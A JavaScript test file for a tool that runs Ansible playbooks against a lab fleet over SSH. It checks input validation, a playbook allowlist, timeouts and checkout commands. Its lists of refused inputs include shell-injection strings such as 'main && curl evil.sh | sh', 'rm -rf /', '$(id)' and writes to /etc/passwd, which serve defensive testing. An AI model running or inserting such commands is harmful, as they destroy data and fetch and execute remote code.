/**
 * The ref reaches a remote shell, so its SHAPE is the containment.
 *
 * `ssh` joins its arguments into a single string the remote shell interprets, whatever the local caller
 * passes — so unlike `command: argv:` in Ansible, there is no structural escape here and the value has to
 * be constrained instead. Same rule as `isValidCaptureId`: make the dangerous thing inexpressible rather
 * than trying to reject it, on the machine that holds the fleet SSH key of all places.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { validRef, PLAYBOOKS, LIMIT_PATTERN, SERIAL_PATTERN, PLAYBOOK_TIMEOUT_MS, DEFAULT_PLAYBOOK_TIMEOUT_MS,
  onTheControlPlane, journalScope, controlPlaneCheckout }
  from "./fleet-playbook.mjs";

test("commits and ordinary branch names are accepted", () => {
  for (const ref of ["afec73d", "65ead9b1c2d3e4f5", "main", "v8-feature-schema", "origin/main", "v1.2.3"]) {
    assert.equal(validRef(ref), true, ref);
  }
});

test("anything that could reach a shell is refused", () => {
  for (const ref of [
    "main; rm -rf /", "main && curl evil.sh | sh", "$(id)", "`id`", "main | tee /etc/passwd",
    "main\nrm -rf /", "main > /etc/cron.d/x", "a'b", 'a"b', "main&", "",
  ]) {
    assert.equal(validRef(ref), false, JSON.stringify(ref));
  }
});

test("path traversal is refused even though slashes are legal in a ref", () => {
  // `origin/main` must work, so slashes cannot simply be banned — which is exactly what makes `..` its
  // own check rather than something the character class already covers.
  assert.equal(validRef("origin/main"), true);
  assert.equal(validRef("../../etc/passwd"), false);
  assert.equal(validRef("main/../../../root"), false);
});

test("an over-long ref is refused, so the bound is real rather than assumed", () => {
  assert.equal(validRef("a".repeat(64)), true);
  assert.equal(validRef("a".repeat(65)), false);
});

test("only the named playbooks are runnable, and they are names rather than paths", () => {
  // The same containment as `-e out=<name>` in lab-job.yml. This value reaches a shell on the box that
  // holds the fleet SSH key, so an arbitrary path here is an arbitrary playbook run against twelve
  // Windows machines.
  // `recover.yml` joined on 2026-09-02 and the addition is deliberate rather than convenient: it kills a
  // node process and REBOOTS, which is the most destructive thing this allowlist permits. It earns that
  // because the fault it exists for cannot be reached any other way — a worker wedged inside a capture
  // does not respond to `Stop-ScheduledTask`, keeps the port, and goes on serving a matching
  // `/health.code` from files the deploy has just updated, so `verify-code.yml`'s reboot never fires.
  assert.deepEqual(PLAYBOOKS,
    ["deploy.yml", "sleep.yml", "provision-role.yml", "recover.yml", "inventory-install.yml", "control-host-install.yml"]);
  // `provision.yml` stays REFUSED and that is not an oversight: it is the UTM/PowerShell provisioning
  // playbook, a different file from `provision-role.yml`, and only the role one should be reachable from
  // a laptop. Two files one character apart, one allowed and one not, is exactly what an allowlist is for.
  for (const bad of ["../../../etc/evil.yml", "provision.yml", "/tmp/x.yml", "deploy.yml; id"]) {
    assert.equal(PLAYBOOKS.includes(bad), false, bad);
  }
});

test("fleet:wake is deliberately NOT one of these", () => {
  // Wake sends Wake-on-LAN magic packets — UDP broadcasts on the LAN, no SSH — so it runs fine from a
  // laptop and routing it through the control plane would add a hop for nothing. Everything that has to
  // talk TO a worker needs the key, and that is the line this list draws.
  assert.equal(PLAYBOOKS.includes("wake.yml"), false);
});

test("--limit takes worker names, and nothing that could reach a shell", () => {
  for (const ok of ["a11y-worker-3", "a11y-worker-3,a11y-worker-4,a11y-worker-5", "a11y_workers"]) {
    assert.equal(LIMIT_PATTERN.test(ok), true, ok);
  }
  for (const bad of [
    "a11y-worker-3; id", "*", "!a11y-worker-2", "a11y-worker-3 a11y-worker-4", "$(id)",
    "../etc", "a11y-worker-3,", "", "all",
  ]) {
    assert.equal(LIMIT_PATTERN.test(bad), false, JSON.stringify(bad));
  }
});

test("a playbook that installs software gets a budget bigger than the default", () => {
  // `provision-role.yml` installs NVDA and an Edge MSI with `serial: 1`, so five boxes is five sequential
  // installs. At the 30-minute default the SSH is killed mid-provision, which leaves a box half
  // configured and a stamp that may or may not have been written — and `fleet:status` then reports
  // INCONSISTENT, which reads like a provisioning bug rather than a timeout.
  assert.ok(PLAYBOOK_TIMEOUT_MS["provision-role.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "provisioning needs longer than a deploy; a ceiling that expires early turns still-working into failed");
  for (const name of Object.keys(PLAYBOOK_TIMEOUT_MS)) {
    assert.ok(PLAYBOOKS.includes(name), `${name} has a timeout but is not a runnable playbook`);
  }
});

test("provisioning REFUSES a worker mid-capture, rather than serialising around it", () => {
  // The design error this replaced: `serial: 1` carried the comment "matters if a run is in flight
  // against the others", which defends a situation that must never be allowed. Provisioning during a run
  // restarts a worker mid-capture (12–520 s of unresumable work) AND moves provisionRevision on some
  // boxes and not others — a capture cache key and a fleet-consistency MUST_MATCH field. That is a
  // mitigation standing in for a refusal, and `sleep.yml` already had the refusal twenty lines away.
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  const executable = play.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(executable, /provision_busy_check\.json\.busy/,
    "provision-role.yml must ask each worker whether it is capturing before touching it");
  assert.match(executable, /ansible\.builtin\.fail:/,
    "a busy worker must FAIL the play, not be skipped: a partially-provisioned fleet is the INCONSISTENT "
    + "state that stops every capture run, so skipping the busy box is the worst option here");
  // Asked over HTTP from the control plane — the same channel the dispatcher uses — so the two cannot
  // disagree about "busy". Over SSH it would be a different question answered a different way.
  assert.match(executable, /url: "http:\/\/\{\{ ansible_host \}\}:\{\{ a11y_port \}\}\/health"/);
});

test("the provisioning batch size is a choice, contained by shape", () => {
  for (const ok of ["0", "1", "6", "99"]) assert.equal(SERIAL_PATTERN.test(ok), true, ok);
  for (const bad of ["", "-1", "1;id", "$(id)", "100", "01", "1.5", " 1"]) {
    assert.equal(SERIAL_PATTERN.test(bad), false, JSON.stringify(bad));
  }
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  assert.match(play, /serial: "\{\{ worker_provision_serial \| default\(1\) \}\}"/,
    "serial must be overridable, and must still default to 1 — fail-fast on a role you just changed");
});

test("the provision stamp is the ENVIRONMENT, not the moment it was applied", () => {
  // `provisionRevision` is a capture cache key AND a fleet-consistency MUST_MATCH field. While it carried
  // a git SHA, any commit — including one touching nothing a capture can observe — changed it, so:
  // re-provisioning after a docs change invalidated every cached capture, and a box provisioned minutes
  // after its peers read INCONSISTENT and blocked every run. Measured 2026-08-25 when a11y-worker-6 failed
  // and could not be re-run alone, because HEAD had moved and four healthy boxes faced re-provisioning.
  //
  // This repo already made the same call one field over: workerCode is deliberately OUTSIDE the cache key
  // because "it changes when a comment changes". A git SHA changes for strictly more reasons.
  const script = readFileSync(fileURLToPath(
    new URL("../../worker-fleet/src/provisioning/stamp-provision-revision.ps1", import.meta.url)), "utf8");
  const code = script.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(code, /^\$stamp = \$combined$/m,
    "the stamp must be the content hash alone — no SHA, no date, nothing that moves on its own");
  assert.ok(!/\$stamp = "\$\(if \(\$gitSha\)/.test(code),
    "the SHA-prefixed stamp is back; it churns a capture cache key for commits that change nothing");
  // Still RECORDED, because losing it would trade one problem for a diagnostic gap.
  assert.match(code, /provision-commit\.txt/,
    "the commit must still be written somewhere for diagnosis, just not into the key");
});

/**
 * A MACHINE MUST NOT SSH TO ITSELF — and this is how a fleet-bearing pipeline broke.
 *
 * `lab:pipeline` dispatches itself to the control plane as a systemd unit and re-runs there with
 * `--local`, so every stage of a fleet-bearing pipeline executes ON the box this script otherwise SSHes
 * to. Root-to-root over the lab key is not authorised there, and the failure reads `Permission denied
 * (publickey,password)` — which looks like a broken key rather than a machine talking to itself.
 *
 * Measured 2026-08-29: `--pipeline=verify` died at stage 1 of 4 with exactly that, twice, and the second
 * time only because the first failure (a package-name import) had masked it.
 */
test("running ON the control plane is detected, so commands go to a shell and not through ssh", () => {
  const here = { en0: [{ address: "203.0.113.172" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(here, "203.0.113.172"), true);
});

test("a laptop on the same LAN is NOT the control plane", () => {
  // The failure that would matter more: deciding we are the control plane when we are not sends every
  // deploy command to the wrong filesystem, silently, and it would look like a checkout that never moved.
  const laptop = { en0: [{ address: "REDACTED-INTERNAL-ADDRESS" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(laptop, "203.0.113.172"), false);
});

test("an interface with no address does not throw or match", () => {
  // `networkInterfaces()` returns undefined for an interface in some states, and `.flat()` keeps the hole.
  assert.equal(onTheControlPlane({ en0: undefined, lo0: [{ }] }, "203.0.113.172"), false);
});

test("the journal a deploy streams is bounded to THIS run, not the unit's whole history", () => {
  // `journalctl -u <unit>` returns every run since boot, oldest first. Measured 2026-09-05: a deploy that
  // correctly REFUSED a busy fleet (`failed=1`, `changed=0`) was read as having deployed, because the PLAY
  // RECAP printed above the refusal was the successful run from seven minutes earlier. Same defect
  // CLAUDE.md records as having cost three wrong readings, arriving in the one place with no bound at all.
  assert.equal(journalScope("a11y-fleet-deploy", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8"),
    "_SYSTEMD_INVOCATION_ID=3f2a1b9c4d5e6f708192a3b4c5d6e7f8");
});

test("no InvocationID falls back to the whole unit, because absent must not look like empty", () => {
  // `lab-status.yml` learned this first: scoping on an id a released unit no longer has returned
  // `-- No entries --`, "a status tool showing nothing where there is plenty, which is worse than showing
  // too much". The caller says so in a line of its own when this branch is taken.
  assert.equal(journalScope("a11y-fleet-deploy", ""), "-u a11y-fleet-deploy");
});

test("anything that is not an invocation id is refused, not interpolated", () => {
  // This value reaches a remote shell on the machine holding the fleet SSH key, so the containment is its
  // SHAPE — the same rule `validRef` follows. `systemctl show` returns 32 hex characters or nothing; every
  // other answer is a broken control plane, and a broken control plane must not become a command.
  for (const bad of [
    "; rm -rf /", "$(id)", "`id`", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8 ; id", "abc", "../../etc",
    "3F2A1B9C4D5E6F708192A3B4C5D6E7F8", "3f2a1b9c4d5e6f708192a3b4c5d6e7f",
  ]) {
    assert.equal(journalScope("a11y-fleet-deploy", bad), "-u a11y-fleet-deploy", JSON.stringify(bad));
  }
});

test("THE CONTROL PLANE IS SENT A COMMIT, NEVER A NAME IT WOULD RESOLVE ITSELF (#666)", () => {
  // The whole defect in one assertion. This command used to end `merge --ff-only origin/${ref}`, so the
  // control plane resolved the ref from a fetch it performed SECONDS AFTER the operator resolved it here.
  // Equal only when nothing merged in between — and on 2026-09-09, with main merging every few minutes,
  // three consecutive deploys failed on it while all nine boxes were healthy.
  const command = controlPlaneCheckout("/root/a11y-witness", "HEAD", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /merge --ff-only --quiet d2729386d6b8807cf610c6e620173930020798a5$/,
    `the merge target must be the resolved commit:\n${command}`);
  assert.doesNotMatch(command, /merge[^\n]*origin\//,
    "merging `origin/<ref>` is the bug: it is a second, later resolution of the same question");
});

test("but the CHECKOUT is still a name, because a bare SHA would detach the control plane (#666)", () => {
  // Not symmetry for its own sake. `localBranch()`'s own comment records what a bare SHA costs anything
  // doing `origin/<ref>`, and a detached control plane is a different failure from a stale one. The name
  // selects the branch; the SHA decides where it lands; only the SHA is compared afterwards.
  const command = controlPlaneCheckout("/root/a11y-witness", "main", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /git checkout --quiet main /,
    `the checkout target stays the branch name:\n${command}`);
  assert.match(command, /git fetch --quiet --all/,
    "the fetch has to come first, or the commit is not in the object store to merge to");
  assert.ok(command.indexOf("checkout") < command.indexOf("merge"),
    `checkout must precede merge:\n${command}`);
});

test("`HEAD` is the DEFAULT ref on the checkout this command is meant to be run from (#666)", () => {
  // Why the race is the default path rather than an edge case: `localBranch()` is `rev-parse --abbrev-ref
  // HEAD`, which is the literal string "HEAD" when detached — and the primary checkout is detached by
  // design AND by hook (`post-checkout` puts it back). So the un-flagged deploy sent `origin/HEAD`, main's
  // tip at whatever instant the control plane fetched.
  const command = controlPlaneCheckout("/root/a11y-witness", "HEAD", "abc1234def5678");

  // `git checkout HEAD` is a deliberate no-op — it is the merge that moves the checkout, and it moves it
  // to one commit rather than to a branch tip that has since advanced.
  assert.match(command, /git checkout --quiet HEAD /, command);
  assert.match(command, /merge --ff-only --quiet abc1234def5678$/, command);
});
